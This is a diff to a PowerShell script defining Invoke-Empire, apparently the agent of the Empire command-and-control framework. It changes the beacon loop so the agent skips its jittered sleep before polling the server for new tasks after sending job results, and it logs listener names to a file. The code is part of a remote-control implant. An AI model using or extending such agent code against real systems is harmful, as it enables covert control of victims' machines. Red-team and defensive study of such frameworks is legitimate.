@@ -783,8 +783,11 @@ function Invoke-Empire {
 	}
 
 	$script:GetTask = {
+        param($HasWaited)
 		foreach ($Listener in $script:listeners){
-			SleepWithJitter($Listener)	
+            if (!$HasWaited) {
+                SleepWithJitter($Listener)	
+            }
 			"calling getTask with listener" | Out-File "out.log" -Append -NoClobber
 			$Listener["name"]|Out-File "out.log" -Append -NoClobber
 
@@ -1179,12 +1182,14 @@ function Invoke-Empire {
             }
         }
 
+        $has_waited = $False
         if ($JobResults) {
             ((& $SendMessage -Packets $JobResults))
+            $has_waited = $True
         }
 
         # get the next task from the server
-        (& $GetTask)
+        (& $GetTask -HasWaited $has_waited)
 
 		# if we are out of listeners, exit
 		if ($script:listeners.count -eq 0){
